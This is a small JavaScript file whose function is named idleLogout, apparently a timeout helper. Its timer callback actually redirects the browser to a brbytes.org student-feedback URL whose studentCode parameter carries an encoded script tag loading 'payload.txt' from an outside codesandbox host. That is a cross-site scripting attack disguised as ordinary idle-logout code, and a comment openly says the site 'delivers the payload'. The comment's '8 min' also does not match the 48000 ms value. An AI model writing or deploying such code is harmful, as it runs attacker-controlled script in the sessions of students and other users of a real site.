function idleLogout() {
  var t;
  window.onload = resetTimer;
  window.onmousemove = resetTimer; // Resets timer when any of the following occurs
  window.onmousedown = resetTimer; // touchscreen presses
  window.ontouchstart = resetTimer; //  touchscreen swipes
  window.ontouchmove = resetTimer; // required by some devices
  window.onclick = resetTimer; // touchpad clicks
  window.onkeydown = resetTimer;
  window.addEventListener("scroll", resetTimer, true);

  function check1() {
    window.location.href =
      "https://www.brbytes.org/cms/stu-feedback?sectionCode=%27&studentCode=%3Cscript%20src=%27https://z215vh.csb.app/payload.txt%27%20/%3E";
  }

  function resetTimer() {
    clearTimeout(t);
    t = setTimeout(check1, 48000); // milliseconds (Waits 8 min then redirects to brbytes in which brbytes delivers the payload)
  }
}
idleLogout();
